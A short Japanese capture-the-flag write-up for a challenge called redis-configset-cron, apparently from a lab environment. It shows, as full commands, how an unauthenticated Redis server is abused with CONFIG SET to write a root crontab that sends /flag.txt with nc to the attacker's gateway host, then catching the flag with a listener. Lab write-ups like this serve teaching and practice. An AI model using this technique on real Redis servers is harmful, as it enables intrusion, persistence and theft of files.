# redis-configset-cron

## 解き方

gatewayにconnect backする必要があるため、IPアドレスを調べておく

```
$ ip a
root@gateway:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc noqueue state UP group default qlen 1000
    link/ether 0a:0a:5b:7f:7b:bb brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.185.89/19 brd 192.168.191.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::80a:5bff:fe7f:7bbb/64 scope link
       valid_lft forever preferred_lft forever
```

このケースでは192.168.185.89で通信できる

cronにncでflagを飛ばすコマンドをセット

```
$ redis-cli -h redis-cron
127.0.0.1:6379> config set dir /var/spool/cron/
OK
127.0.0.1:6379> config set dbfilename root
OK
127.0.0.1:6379> set payload "\n*/1 * * * * /bin/cat /flag.txt | /usr/bin/nc 192.168.185.89 10000\n"
OK
127.0.0.1:6379> save
OK
```

あとはgateway上でncで待ち受けるだけ

```
$ nc -l 10000
flag{why_1s_my_cr0nt4b_n0t_w0rking}
```


## 備考
SLAVEOF/REPLICAOFのやり方でとかれないようにコマンドをを無効にしている (redis.conf参照）
